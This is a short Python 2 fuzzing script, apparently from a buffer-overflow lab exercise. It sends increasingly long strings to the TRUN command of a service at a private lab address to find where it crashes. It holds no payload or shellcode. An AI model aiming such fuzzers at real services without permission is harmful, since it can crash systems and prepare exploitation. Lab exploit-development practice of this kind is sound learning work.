#!/usr/bin/python

import socket
import os
import sys
import time

host="10.211.55.7"
port=4444

buffer=["A"]
counter=100
while len(buffer) <= 30:
                buffer.append("A"*counter)
                counter=counter+200

for string in buffer:
        print "fuzzing TRUN with %s bytes" % len(string)
        expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        expl.connect((host, port))
        expl.send("TRUN /.:/" + string)
        expl.close()
	time.sleep(1)
